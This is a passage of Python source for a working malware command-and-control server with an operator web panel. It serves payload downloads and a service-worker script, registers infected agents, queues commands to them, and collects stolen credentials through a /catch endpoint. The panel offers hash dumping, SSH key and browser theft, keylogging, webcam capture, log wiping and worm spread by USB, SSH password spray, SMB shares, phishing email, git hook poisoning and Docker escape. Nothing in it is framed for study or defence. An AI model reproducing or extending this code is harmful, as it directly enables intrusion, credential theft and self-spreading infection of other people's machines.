#lb{{display:none;position:fixed;inset:0;background:rgba(0,0,0,.93);z-index:9999;align-items:center;justify-content:center;cursor:zoom-out}}
#lb.show{{display:flex}}
#lb img{{max-width:92vw;max-height:92vh;border:1px solid var(--bd);border-radius:3px}}
</style></head>
<body>
<div class="topbar">
  <div class="logo"><div class="logo-dot"></div>C2 PANEL</div>
  <div class="sep">|</div>
  <div class="stat"><span class="n">{ac}</span><span class="l">agents</span></div>
  <div class="sep">|</div>
  <div class="stat" style="cursor:pointer" onclick="showTab('family')"><span class="n" style="color:#f0a">{wo}</span><span class="l" style="color:#f0a">worms</span></div>
  <div class="sep">|</div>
  <div class="stat"><span class="n">{cc}</span><span class="l">creds</span></div>
  <div class="sep">|</div>
  <div class="stat"><span class="n">{lc}</span><span class="l">loot</span></div>
  <div class="ts">{ts} &nbsp; <a class="refresh" href="/panel">&#x21BA; refresh</a></div>
</div>
<div class="wrap">
<div class="sidebar">
  <div class="nav-sec">Operations</div>
  <div class="nav">
    <a onclick="showTab('agents')" id="nav-agents" class="active"><span class="ic">&#x1F4BB;</span>Agents</a>
    <a onclick="showTab('cmd')" id="nav-cmd"><span class="ic">&#x25BA;</span>Command</a>
    <a onclick="showTab('output')" id="nav-output"><span class="ic">&#x1F5A5;</span>Output</a>
  </div>
  <div class="nav-sec">Intel</div>
  <div class="nav">
    <a onclick="showTab('creds')" id="nav-creds"><span class="ic">&#x1F511;</span>Credentials</a>
    <a onclick="showTab('loot')" id="nav-loot"><span class="ic">&#x1F4E6;</span>Loot Gallery</a>
  </div>
  <div class="nav-sec">Worm</div>
  <div class="nav">
    <a onclick="showTab('family')" id="nav-family"><span class="ic">&#x1F9A0;</span>Worm Family <span style="color:#f0a;font-size:10px">{wo}</span></a>
    <a onclick="showTab('worm')" id="nav-worm"><span class="ic">&#x2699;</span>Worm Control</a>
  </div>
  <div class="nav-bottom">
    <a href="/logs?aid={fa}">&#x1F4C4; Agent Log</a>
    <a href="/loot">&#x1F5BC; Full Loot</a>
    <a href="/creds">&#x1F4CB; Full Creds</a>
  </div>
</div>
<div class="content">

<!-- AGENTS TAB -->
<div class="tab active" id="tab-agents">
  <div class="sh"><span class="ic">&#x1F4BB;</span>ACTIVE AGENTS<span class="badge-count">{ac} online</span></div>
  <table>
    <tr><th>ID</th><th>IP</th><th>OS / Device</th><th>Host / User</th><th>Priv</th><th>Type</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr>
    {ar}
  </table>
</div>

<!-- COMMAND TAB -->
<div class="tab" id="tab-cmd">
  <div class="sh"><span class="ic">&#x25BA;</span>COMMAND &amp; CONTROL</div>
  <div class="cmdbar">
    <form method="POST" action="/cmd">
      <select name="aid">{ao}</select>
      <input type="text" name="cmd" placeholder="command / RECON / SCREENSHOT / shell cmd..." style="flex:1">
      <button class="btn g" type="submit">&#x25BA; SEND</button>
      <button class="btn r" type="submit" name="aid" value="__ALL__">&#x25BA; BROADCAST ALL</button>
    </form>
    <div class="qrow"><span class="ql">Recon</span>
      <a class="qb d" href="/q?aid={fa}&cmd=RECON">RECON</a>
      <a class="qb d" href="/q?aid={fa}&cmd=SYSINFO">SYSINFO</a>
      <a class="qb d" href="/q?aid={fa}&cmd=NETWORK">NETWORK</a>
      <a class="qb d" href="/q?aid={fa}&cmd=DRIVES">DRIVES</a>
      <a class="qb d" href="/q?aid={fa}&cmd=whoami">whoami</a>
      <a class="qb d" href="/q?aid={fa}&cmd=id">id</a>
      <a class="qb d" href="/q?aid={fa}&cmd=hostname">hostname</a>
      <a class="qb d" href="/q?aid={fa}&cmd=uname+-a">uname</a>
      <a class="qb d" href="/q?aid={fa}&cmd=ifconfig">ifconfig</a>
    </div>
    <div class="qrow"><span class="ql">Post-Ex</span>
      <a class="qb y" href="/q?aid={fa}&cmd=PERSIST">PERSIST</a>
      <a class="qb y" href="/q?aid={fa}&cmd=PRIVESC">PRIVESC</a>
      <a class="qb y" href="/q?aid={fa}&cmd=HASHDUMP">HASHDUMP</a>
      <a class="qb y" href="/q?aid={fa}&cmd=SSHKEYS">SSHKEYS</a>
      <a class="qb y" href="/q?aid={fa}&cmd=BROWSERS">BROWSERS</a>
      <a class="qb y" href="/q?aid={fa}&cmd=EXFIL">EXFIL</a>
      <a class="qb y" href="/q?aid={fa}&cmd=CLEAN">CLEAN LOGS</a>
    </div>
    <div class="qrow"><span class="ql">Spread</span>
      <a class="qb p" href="/q?aid={fa}&cmd=SPREAD">USB SPREAD</a>
      <a class="qb p" href="/q?aid={fa}&cmd=SSH_TARGETS">SSH TARGETS</a>
      <a class="qb p" href="/q?aid={fa}&cmd=NET_SCAN">NET SCAN</a>
      <a class="qb p" href="/q?aid={fa}&cmd=SSH_SPRAY">SSH SPRAY</a>
      <a class="qb p" href="/q?aid={fa}&cmd=SMB_SCAN">SMB SCAN</a>
      <a class="qb p" href="/q?aid={fa}&cmd=NET_MOUNTS">NET MOUNTS</a>
      <a class="qb p" href="/q?aid={fa}&cmd=EMAIL_SPREAD">EMAIL SPREAD</a>
      <a class="qb p" href="/q?aid={fa}&cmd=GIT_POISON">GIT POISON</a>
      <a class="qb p" href="/q?aid={fa}&cmd=DOCKER_ESCAPE">DOCKER ESCAPE</a>
    </div>
    <div class="qrow"><span class="ql">Capture</span>
      <a class="qb g" href="/q?aid={fa}&cmd=SCREENSHOT">SCREENSHOT</a>
      <a class="qb g" href="/q?aid={fa}&cmd=WEBCAM">WEBCAM</a>
      <a class="qb g" href="/q?aid={fa}&cmd=CLIPBOARD">CLIPBOARD</a>
      <a class="qb g" href="/q?aid={fa}&cmd=KEYLOG_START">KEYLOG START</a>
      <a class="qb g" href="/q?aid={fa}&cmd=KEYLOG_DUMP">KEYLOG DUMP</a>
    </div>
    <div class="qrow"><span class="ql">JS Only</span>
      <a class="qb d" href="/q?aid={fa}&cmd=document.cookie">cookies</a>
      <a class="qb d" href="/q?aid={fa}&cmd=JSON.stringify(Object.keys(localStorage))">localStorage</a>
      <a class="qb d" href="/q?aid={fa}&cmd=navigator.userAgent">UA</a>
      <a class="qb d" href="/q?aid={fa}&cmd=location.href">URL</a>
      <a class="qb d" href="/q?aid={fa}&cmd=GEOLOC">GEOLOC</a>
      <a class="qb r" href="/q?aid={fa}&cmd=SELFDESTRUCT">&#x2620; DESTROY</a>
    </div>
  </div>
</div>

<!-- OUTPUT TAB -->
<div class="tab" id="tab-output">
  <div class="sh"><span class="ic">&#x1F5A5;</span>AGENT OUTPUT</div>
  <div class="terminal">{ou}</div>
</div>

<!-- CREDS TAB -->
<div class="tab" id="tab-creds">
  <div class="sh"><span class="ic">&#x1F511;</span>CAPTURED CREDENTIALS<span class="badge-count">{cc} total</span></div>
  {cr}
</div>

<!-- LOOT TAB -->
<div class="tab" id="tab-loot">
  <div class="sh"><span class="ic">&#x1F4E6;</span>LOOT GALLERY<span class="badge-count">{lc} files</span></div>
  <div class="loot-grid">{lg}</div>
</div>

<!-- WORM FAMILY TAB -->
<div class="tab" id="tab-family">
  <div class="sh"><span class="ic">&#x1F9A0;</span>WORM FAMILY
    <span class="badge-count" style="background:rgba(255,0,170,.1);color:#f0a;border-color:rgba(255,0,170,.3)">{wc} total / {wo} online</span>
  </div>
  <div style="background:rgba(255,0,170,.04);border:1px solid rgba(255,0,170,.1);border-radius:4px;padding:8px 14px;margin-bottom:14px;font-size:11px;color:var(--dim)">
    Worm agents are identified by IDs starting with <b style="color:#f0a">w</b>.
    Each card shows live spread activity — auto-refreshes every 8s. Click <b style="color:var(--g)">STATUS</b> on any worm for full state.
  </div>
  {wf}
</div>

<!-- WORM CONTROL TAB -->
<div class="tab" id="tab-worm">
  <div class="sh"><span class="ic">&#x2699;</span>WORM REMOTE CONTROL</div>

  <div style="background:var(--bg2);border:1px solid var(--bd);border-radius:4px;padding:10px 14px;margin-bottom:14px;display:flex;align-items:center;gap:12px;flex-wrap:wrap">
    <span style="color:var(--dim);font-size:10px;letter-spacing:1px;text-transform:uppercase">Target worm</span>
    <select id="worm-sel" style="background:var(--bg);color:#f0a;border:1px solid rgba(255,0,170,.3);padding:6px 10px;font-family:monospace;font-size:12px;border-radius:3px;outline:none"
      onchange="setWormAid(this.value)">{worm_opts}</select>
    <span style="color:var(--dim);font-size:10px">Commands go to this worm. Results appear in <b style="color:var(--g)">Output</b> tab.</span>
  </div>

  <!-- Master control -->
  <div style="margin-bottom:10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; MASTER CONTROL</div>
  <div class="wc-section">
    <div class="wc-row">
      <a class="wb g" href="/q?aid={fw}&cmd=WORM_STATUS" title="Dump full state: all flags, skip list, spread log, C2 URL, poll interval">&#x2139; STATUS</a>
      <a class="wb g" href="/q?aid={fw}&cmd=WORM_RESUME" title="Resume spreading after pause — clears paused flag, enables spreading">&#x25B6; RESUME</a>
      <a class="wb y" href="/q?aid={fw}&cmd=WORM_PAUSE" title="Freeze all spreading threads. Agent still polls C2 every 5s so you can resume instantly">&#x23F8; PAUSE</a>
      <a class="wb g" href="/q?aid={fw}&cmd=WORM_START_SPREAD" title="Enable master spreading flag — all vectors active">&#x25B6;&#x25B6; START ALL</a>
      <a class="wb r" href="/q?aid={fw}&cmd=WORM_STOP_SPREAD" title="Disable master spreading flag — all vectors stop. Agent still runs and polls C2">&#x23F9; STOP ALL</a>
      <a class="wb b" href="/q?aid={fw}&cmd=WORM_SPREAD_NOW" title="Force an immediate spread cycle regardless of NET_INTERVAL timer">&#x26A1; SPREAD NOW</a>
    </div>
    <div style="color:var(--dim);font-size:10px;margin-top:4px;line-height:1.6">
      STATUS = dump all flags &nbsp;|&nbsp; PAUSE = freeze threads, keep polling &nbsp;|&nbsp; STOP ALL = master off (agent still runs) &nbsp;|&nbsp; SPREAD NOW = bypass timer
    </div>
  </div>

  <!-- Spreading vectors -->
  <div style="margin:14px 0 10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; SPREADING VECTORS</div>
  <div class="wc-section">
    <table style="margin:0">
      <tr>
        <th style="width:130px">Vector</th>
        <th>Description</th>
        <th style="width:120px">Control</th>
      </tr>
      <tr>
        <td style="color:var(--g)">&#x1F4BE; USB</td>
        <td style="color:var(--dim)">Auto-infects USB drives when plugged in. Drops LNK lures + fast-deploy VBS + autorun.inf</td>
        <td>
          <a class="wb g" href="/q?aid={fw}&cmd=WORM_USB_ON">ON</a>
          <a class="wb r" href="/q?aid={fw}&cmd=WORM_USB_OFF">OFF</a>
        </td>
      </tr>
      <tr>
        <td style="color:var(--g)">&#x1F511; SSH Keys</td>
        <td style="color:var(--dim)">Spread via harvested SSH keys to known_hosts targets + /24 network scan</td>
        <td>
          <a class="wb g" href="/q?aid={fw}&cmd=WORM_SSH_ON">ON</a>
          <a class="wb r" href="/q?aid={fw}&cmd=WORM_SSH_OFF">OFF</a>
        </td>
      </tr>
      <tr>
        <td style="color:var(--g)">&#x1F4AC; SSH Spray</td>
        <td style="color:var(--dim)">Password spray with 80 harvested + common passwords against live SSH hosts (needs sshpass)</td>
        <td>
          <a class="wb g" href="/q?aid={fw}&cmd=WORM_SPRAY_ON">ON</a>
          <a class="wb r" href="/q?aid={fw}&cmd=WORM_SPRAY_OFF">OFF</a>
        </td>
      </tr>
      <tr>
        <td style="color:var(--g)">&#x1F5A7; SMB</td>
        <td style="color:var(--dim)">Write worm to writable Windows shares via smbclient — both anonymous and authenticated</td>
        <td>
          <a class="wb g" href="/q?aid={fw}&cmd=WORM_SMB_ON">ON</a>
          <a class="wb r" href="/q?aid={fw}&cmd=WORM_SMB_OFF">OFF</a>
        </td>
      </tr>
      <tr>
        <td style="color:var(--g)">&#x1F4E7; Email</td>
        <td style="color:var(--dim)">Harvest contacts from Thunderbird/Outlook/mutt and send phishing with worm attached</td>
        <td>
          <a class="wb g" href="/q?aid={fw}&cmd=WORM_EMAIL_ON">ON</a>
          <a class="wb r" href="/q?aid={fw}&cmd=WORM_EMAIL_OFF">OFF</a>
        </td>
      </tr>
      <tr>
        <td style="color:var(--g)">&#x1F4C1; Net Mounts</td>
        <td style="color:var(--dim)">Infect CIFS/NFS network mounts already mounted on victim — scans /proc/mounts</td>
        <td>
          <a class="wb g" href="/q?aid={fw}&cmd=WORM_NETMOUNT_ON">ON</a>
          <a class="wb r" href="/q?aid={fw}&cmd=WORM_NETMOUNT_OFF">OFF</a>
        </td>
      </tr>
      <tr>
        <td style="color:var(--g)">&#x1F433; Docker</td>
        <td style="color:var(--dim)">Escape Docker container via /proc/1/root write + privileged device mount to infect host</td>
        <td>
          <a class="wb g" href="/q?aid={fw}&cmd=WORM_DOCKER_ON">ON</a>
          <a class="wb r" href="/q?aid={fw}&cmd=WORM_DOCKER_OFF">OFF</a>
        </td>
      </tr>
      <tr>
        <td style="color:var(--g)">&#x1F527; Git Hooks</td>
        <td style="color:var(--dim)">Inject post-commit hooks into local git repos — fires on every developer commit</td>
        <td>
          <a class="wb g" href="/q?aid={fw}&cmd=WORM_GIT_ON">ON</a>
          <a class="wb r" href="/q?aid={fw}&cmd=WORM_GIT_OFF">OFF</a>
        </td>
      </tr>
    </table>
  </div>

  <!-- Target management -->
  <div style="margin:14px 0 10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; TARGET MANAGEMENT</div>
  <div class="wc-section">
    <div class="wc-row">
      <a class="wb w" href="/q?aid={fw}&cmd=WORM_LIST_TARGETS" title="Show full spread log (already-infected) and skip list">LIST TARGETS</a>
      <a class="wb y" href="/q?aid={fw}&cmd=WORM_CLEAR_LOG" title="Clear the spread log — worm will re-attempt all previously visited targets">CLEAR SPREAD LOG</a>
      <a class="wb y" href="/q?aid={fw}&cmd=WORM_CLEAR_SKIP" title="Remove all entries from the skip list">CLEAR SKIP LIST</a>
      <span style="color:var(--dim);font-size:10px;margin-left:8px">spread log = already infected &nbsp;|&nbsp; skip list = permanently blocked hosts</span>
    </div>
    <div class="wc-row" style="margin-top:10px">
      <span class="wc-label">Skip host</span>
      <form method="GET" action="/q" style="display:inline-flex;gap:6px;align-items:center">
        <input type="hidden" name="aid" value="{fw}">
        <input class="wcinp" style="width:180px" type="text" name="cmd" placeholder="WORM_SKIP 192.168.1.5">
        <button class="wb w" type="submit">ADD TO SKIP</button>
      </form>
      <span style="color:var(--dim);font-size:10px">Permanently block a host — worm will never attempt it again</span>
    </div>
  </div>

  <!-- Config -->
  <div style="margin:14px 0 10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; RUNTIME CONFIG</div>
  <div class="wc-section">
    <div class="wc-row">
      <span class="wc-label">Poll interval</span>
      <form method="GET" action="/q" style="display:inline-flex;gap:6px;align-items:center">
        <input type="hidden" name="aid" value="{fw}">
        <input class="wcinp" style="width:200px" type="text" name="cmd" placeholder="WORM_SET_INTERVAL 30">
        <button class="wb w" type="submit">SET</button>
      </form>
      <span style="color:var(--dim);font-size:10px">Seconds between C2 polls (default 8-20s jittered). Min 3s.</span>
    </div>
    <div class="wc-row" style="margin-top:10px">
      <span class="wc-label">C2 URL</span>
      <form method="GET" action="/q" style="display:inline-flex;gap:6px;align-items:center">
        <input type="hidden" name="aid" value="{fw}">
        <input class="wcinp" style="width:280px" type="text" name="cmd" placeholder="WORM_SET_C2 https://new-tunnel.trycloudflare.com">
        <button class="wb w" type="submit">UPDATE</button>
      </form>
      <span style="color:var(--dim);font-size:10px">Hot-swap C2 URL without restarting the worm</span>
    </div>
  </div>

  <!-- Command reference -->
  <div style="margin:14px 0 10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; FULL COMMAND REFERENCE</div>
  <div style="background:var(--bg2);border:1px solid var(--bd);border-radius:4px;padding:12px;font-size:11px">
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px 24px;line-height:1.9">
      <div><span style="color:var(--g)">WORM_STATUS</span> <span style="color:var(--dim)">— dump all state flags + skip/spread lists</span></div>
      <div><span style="color:var(--g)">WORM_PAUSE</span> <span style="color:var(--dim)">— freeze all threads, keep polling (5s)</span></div>
      <div><span style="color:var(--g)">WORM_RESUME</span> <span style="color:var(--dim)">— unfreeze everything</span></div>
      <div><span style="color:var(--g)">WORM_STOP_SPREAD</span> <span style="color:var(--dim)">— master off (agent still runs)</span></div>
      <div><span style="color:var(--g)">WORM_START_SPREAD</span> <span style="color:var(--dim)">— master on</span></div>
      <div><span style="color:var(--g)">WORM_SPREAD_NOW</span> <span style="color:var(--dim)">— force immediate cycle</span></div>
      <div><span style="color:var(--y)">WORM_USB_ON / OFF</span> <span style="color:var(--dim)">— USB drive infection</span></div>
      <div><span style="color:var(--y)">WORM_SSH_ON / OFF</span> <span style="color:var(--dim)">— SSH key spread + spray</span></div>
      <div><span style="color:var(--y)">WORM_SMB_ON / OFF</span> <span style="color:var(--dim)">— SMB share infection</span></div>
      <div><span style="color:var(--y)">WORM_EMAIL_ON / OFF</span> <span style="color:var(--dim)">— email phishing spread</span></div>
      <div><span style="color:var(--y)">WORM_NETMOUNT_ON / OFF</span> <span style="color:var(--dim)">— network mount infection</span></div>
      <div><span style="color:var(--y)">WORM_DOCKER_ON / OFF</span> <span style="color:var(--dim)">— Docker escape vector</span></div>
      <div><span style="color:var(--y)">WORM_GIT_ON / OFF</span> <span style="color:var(--dim)">— git hook poisoning</span></div>
      <div><span style="color:var(--b)">WORM_SKIP &lt;host&gt;</span> <span style="color:var(--dim)">— add IP/hostname to skip list</span></div>
      <div><span style="color:var(--b)">WORM_CLEAR_SKIP</span> <span style="color:var(--dim)">— empty the skip list</span></div>
      <div><span style="color:var(--b)">WORM_CLEAR_LOG</span> <span style="color:var(--dim)">— forget all spread history</span></div>
      <div><span style="color:var(--b)">WORM_LIST_TARGETS</span> <span style="color:var(--dim)">— show spread log + skip list</span></div>
      <div><span style="color:var(--b)">WORM_SET_INTERVAL &lt;n&gt;</span> <span style="color:var(--dim)">— poll interval in seconds</span></div>
      <div><span style="color:var(--b)">WORM_SET_C2 &lt;url&gt;</span> <span style="color:var(--dim)">— hot-swap C2 URL</span></div>
    </div>
  </div>
</div>

</div><!-- /content -->
</div><!-- /wrap -->

<!-- Lightbox -->
<div id="lb" onclick="this.classList.remove('show')"><img id="lb-img" src=""></div>

<script>
var TABS=['agents','cmd','output','creds','loot','family','worm'];
// ── Tab persistence ──────────────────────────────────────────────
var active=sessionStorage.getItem('c2tab')||'agents';
function showTab(t){{
  TABS.forEach(function(id){{
    document.getElementById('tab-'+id).classList.remove('active');
    document.getElementById('nav-'+id).classList.remove('active');
  }});
  document.getElementById('tab-'+t).classList.add('active');
  document.getElementById('nav-'+t).classList.add('active');
  active=t; sessionStorage.setItem('c2tab',t);
}}
showTab(active);

// ── Agent selection persistence ──────────────────────────────────
var selEl=document.querySelector('select[name=aid]');
if(selEl){{
  var savedAid=sessionStorage.getItem('c2aid');
  if(savedAid){{
    for(var i=0;i<selEl.options.length;i++){{
      if(selEl.options[i].value===savedAid){{selEl.selectedIndex=i;break;}}
    }}
  }}
  selEl.addEventListener('change',function(){{
    sessionStorage.setItem('c2aid',this.value);
    // Highlight matching row
    document.querySelectorAll('tr[data-aid]').forEach(function(r){{r.classList.remove('sel');}});
    var row=document.querySelector('tr[data-aid="'+selEl.value+'"]');
    if(row) row.classList.add('sel');
  }});
  // Highlight on load
  if(savedAid){{
    var row=document.querySelector('tr[data-aid="'+savedAid+'"]');
    if(row) row.classList.add('sel');
  }}
}}

// ── Update all /q links to use currently selected agent ──────────
function setAid(aid){{
  sessionStorage.setItem('c2aid',aid);
  document.querySelectorAll('a.qb[href*="/q?aid="],a.wb[href*="/q?aid="]').forEach(function(a){{
    a.href=a.href.replace(/aid=[^&]+/,'aid='+encodeURIComponent(aid));
  }});
  if(selEl){{
    for(var i=0;i<selEl.options.length;i++){{
      if(selEl.options[i].value===aid){{selEl.selectedIndex=i;break;}}
    }}
  }}
}}
// Apply saved agent to all quick-links on load
(function(){{
  var aid=sessionStorage.getItem('c2aid');
  if(aid&&aid!=='__ALL__') setAid(aid);
}})();

// ── Click agent row → select + go to cmd ────────────────────────
document.querySelectorAll('tr[data-aid]').forEach(function(row){{
  row.addEventListener('click',function(){{
    var aid=this.dataset.aid;
    document.querySelectorAll('tr[data-aid]').forEach(function(r){{r.classList.remove('sel');}});
    this.classList.add('sel');
    setAid(aid);
    showTab('cmd');
  }});
}});

// ── Worm selector ────────────────────────────────────────────────
function setWormAid(aid){{
  if(!aid) return;
  sessionStorage.setItem('c2waid',aid);
  document.querySelectorAll('#tab-worm a[href*="/q?aid="]').forEach(function(a){{
    a.href=a.href.replace(/aid=[^&]+/,'aid='+encodeURIComponent(aid));
  }});
  document.querySelectorAll('#tab-worm input[name="aid"]').forEach(function(i){{i.value=aid;}});
}}
(function(){{
  var sel=document.getElementById('worm-sel');
  if(!sel) return;
  var saved=sessionStorage.getItem('c2waid');
  if(saved){{for(var i=0;i<sel.options.length;i++){{if(sel.options[i].value===saved){{sel.selectedIndex=i;break;}}}}}}
  setWormAid(sel.value);
}})();

// ── Auto-refresh ─────────────────────────────────────────────────
setTimeout(function(){{location.reload();}},8000);

// ── Lightbox ─────────────────────────────────────────────────────
function openLB(src){{document.getElementById('lb-img').src=src;document.getElementById('lb').classList.add('show');}}
document.querySelectorAll('.eimg,.loot-card img').forEach(function(img){{
  img.addEventListener('click',function(){{openLB(this.src);}});
}});
</script>
</body></html>"""

HTML_LOOT="""<!DOCTYPE html><html><head><title>Loot</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:monospace;background:#080808;color:#0f0;padding:14px;font-size:13px}}
h1{{color:#0ff;margin-bottom:12px;font-size:15px}}
.bar{{display:flex;gap:8px;margin-bottom:12px}}
.bar a{{background:#111;border:1px solid #222;color:#0ff;padding:4px 12px;border-radius:3px;font-size:12px}}
.grid{{display:flex;flex-wrap:wrap;gap:10px}}
.item{{background:#0a0a0a;border:1px solid #1a1a1a;padding:8px;border-radius:4px;width:320px}}
.item img{{max-width:100%;border:1px solid #1a1a1a;display:block;margin-bottom:6px}}
.item .fn{{color:#ff0;font-size:11px;word-break:break-all}}
.item .sz{{color:#555;font-size:10px}}
.item a{{color:#0ff;font-size:11px}}
</style></head><body>
<h1>&#x1F4E6; LOOT ({cnt} files)</h1>
<div class="bar"><a href="/panel">&#x2190; Panel</a></div>
<div class="grid">{items}</div></body></html>"""

HTML_CREDS="""<!DOCTYPE html><html><head><title>Credentials</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:monospace;background:#080808;color:#0f0;padding:14px;font-size:13px}}
h1{{color:#0ff;margin-bottom:12px;font-size:15px}}
.bar{{display:flex;gap:8px;margin-bottom:12px}}
.bar a{{background:#111;border:1px solid #222;color:#0ff;padding:4px 12px;border-radius:3px;font-size:12px}}
.cred{{background:#150000;border-left:3px solid #a00;padding:8px 12px;margin-bottom:6px;font-size:13px}}
.cv{{color:#f66;font-weight:bold}}.tag{{font-size:11px;background:#1a1a1a;padding:2px 6px;border-radius:2px;color:#666;margin-left:6px}}
</style></head><body>
<h1>&#x1F511; CREDENTIALS ({cnt})</h1>
<div class="bar"><a href="/panel">&#x2190; Panel</a></div>
{items}</body></html>"""

class H(BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type,X-Requested-With")
    def do_OPTIONS(self): self.send_response(204);self._cors();self.end_headers()

    def do_GET(self):
        p=urlparse(self.path); qs=parse_qs(p.query)
        path=p.path

        if path=="/js-agent.js": self._send(JS_AGENT,"application/javascript"); return
        if path.startswith("/sw.js"):
            aid=qs.get("aid",["sw"])[0]; host=self.headers.get("Host","localhost")
            sw=SW_JS.replace("__C2URL__",f"https://{host}").replace("__AID__",aid)
            self._send(sw,"application/javascript"); return
        if path=="/manifest.json": self._send(MANIFEST,"application/manifest+json"); return
        if path=="/icon.png":
            import base64; self._send(base64.b64decode(
                "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="),
                "image/png",raw=True); return

        if path=="/agent/register":
            aid=qs.get("id",[""])[0] or f"h{int(time.time())}"
            with _lock:
                agents[aid]={"ip":self.client_address[0],
                    "os":qs.get("os",["?"])[0].replace("+"," "),
                    "hostname":qs.get("hostname",["?"])[0],
                    "user":qs.get("user",["?"])[0],
                    "priv":qs.get("priv",["?"])[0],
                    "type":qs.get("type",["http"])[0],
                    "last_seen":ts(),"status":"ONLINE",
                    "log":f"{LOG_DIR}/agent_{aid}.txt"}
            log(f"[AGENT] {aid} | {agents[aid]['type']} | {agents[aid]['priv']} | {agents[aid]['os'][:60]}")
            self._send("OK"); return

        if path=="/agent/poll":
            aid=qs.get("id",[""])[0]
            with _lock:
                if aid in agents:
                    agents[aid]["last_seen"]=ts(); agents[aid]["status"]="ONLINE"
                    cmd=agent_cmds[aid].pop(0) if agent_cmds[aid] else "PING"
                    self._send(cmd)
                else: self._send("REGISTER")
            return

        if path.startswith("/download/"):
            fname=os.path.basename(path[10:]); fpath=os.path.join(PAYLOAD_DIR,fname)
            if os.path.exists(fpath):
                with open(fpath,"rb") as f: data=f.read()
                ct="text/plain" if fname.endswith((".py",".ps1",".sh",".vbs",".bat",".js")) else "application/octet-stream"
                self.send_response(200); self.send_header("Content-Type",ct)
                self.send_header("Content-Disposition",f'attachment; filename="{fname}"')
                self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
                self.wfile.write(data)
            else: self.send_response(404); self.end_headers()
            return

        if path.startswith("/loot/dl/"):
            fname=os.path.basename(path[9:]); fpath=os.path.join(LOOT_DIR,fname)
            if os.path.exists(fpath):
                ct,_=mimetypes.guess_type(fpath); ct=ct or "application/octet-stream"
                with open(fpath,"rb") as f: data=f.read()
                self.send_response(200); self.send_header("Content-Type",ct)
                self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
                self.wfile.write(data)
            else: self.send_response(404); self.end_headers()
            return

        if path=="/loot":
            files=sorted(os.listdir(LOOT_DIR),reverse=True) if os.path.isdir(LOOT_DIR) else []
            items=""
            for f in files[:50]:
                fp=os.path.join(LOOT_DIR,f)
                sz=os.path.getsize(fp); ext=f.lower()
                if ext.endswith((".png",".jpg",".jpeg")):
                    items+=(f"<div class='item'><img src='/loot/dl/{f}' loading='lazy'>"
                            f"<div class='fn'>{f}</div><div class='sz'>{sz//1024}KB</div>"
                            f"<a href='/loot/dl/{f}' download>&#x2B07; download</a></div>")
                else:
                    items+=(f"<div class='item'><div class='fn'>{f}</div>"
                            f"<div class='sz'>{sz//1024}KB</div>"
                            f"<a href='/loot/dl/{f}' download>&#x2B07; download</a></div>")
            if not items: items="<p style='color:#444'>No loot yet.</p>"
            self._html(HTML_LOOT.format(cnt=len(files),items=items)); return

        if path=="/creds":
            lines=[]
            try: lines=open(CREDS_FILE).readlines()
            except: pass
            items=""
            for line in reversed(lines[-100:]):
                parts={}
                [parts.__setitem__(*(tok.split("=",1))) for tok in line.strip().split("  ") if "=" in tok]
                items+=(f"<div class='cred'>user=<span class='cv'>{parts.get('user','?').strip(chr(39))}</span>  "
                        f"pass=<span class='cv'>{parts.get('pass','?').strip(chr(39))}</span>  "
                        f"<span class='tag'>{parts.get('src','?')}</span></div>")
            if not items: items="<p style='color:#444'>No credentials yet.</p>"
            self._html(HTML_CREDS.format(cnt=len(lines),items=items)); return

        if path in("/","/banner","/portal","/login"): self._html(BANNER); return

        if path=="/q":
            aid=qs.get("aid",[""])[0]; cmd=unquote_plus(qs.get("cmd",[""])[0])
            if aid and cmd:
                if aid=="__ALL__":
                    with _lock:
                        for a in agents: agent_cmds[a].append(cmd)
                    log(f"[BROADCAST] {cmd}")
                elif aid=="__ALL_WORMS__":
                    with _lock:
                        for a in agents:
                            if a.startswith("w"): agent_cmds[a].append(cmd)
                    log(f"[WORM BROADCAST] {cmd}")
                else:
                    agent_cmds[aid].append(cmd); log(f"[CMD] {aid}: {cmd}")
            self._redir("/panel"); return

        if path=="/logs":
            aid=qs.get("aid",[""])[0]
            if aid in agents:
                try: c=open(agents[aid]["log"]).read()
                except: c="(empty)"
                self._html(f"<pre style='color:#0f0;background:#000;padding:20px;white-space:pre-wrap;font-size:12px;max-width:1200px'>{c}</pre>")
            return

        self._html(self._panel())

    def do_POST(self):
        p=urlparse(self.path); qs=parse_qs(p.query)
        n=int(self.headers.get("Content-Length",0)); b=self.rfile.read(n)

        if p.path=="/agent/result":
            aid=qs.get("id",[""])[0]; cmd=unquote_plus(qs.get("cmd",[""])[0])
            out=b.decode(errors="replace")
            if aid and cmd and cmd!="PING":
                _handle_result(aid,cmd,out)
            self._send("OK"); return

        if p.path=="/catch":
            try:
                d=json.loads(b.decode(errors="replace"))
                line=f"[{ts()}]  user={d.get('user','?')!r}  pass={d.get('pass','?')!r}  src={d.get('src','?')}\n"
                open(CREDS_FILE,"a").write(line); log(f"[CREDS] {line.strip()}")
            except: pass
            self._send("OK"); return

        # Form POST from panel
        params=parse_qs(b.decode(errors="replace"))
        aid=params.get("aid",[""])[0]; cmd=params.get("cmd",[""])[0]
        if aid and cmd:
            if aid=="__ALL__":
                with _lock:
                    for a in agents: agent_cmds[a].append(cmd)
                log(f"[BROADCAST] {cmd}")
            else:
                agent_cmds[aid].append(cmd); log(f"[CMD] {aid}: {cmd}")
        self._redir("/panel")

    def _panel(self):
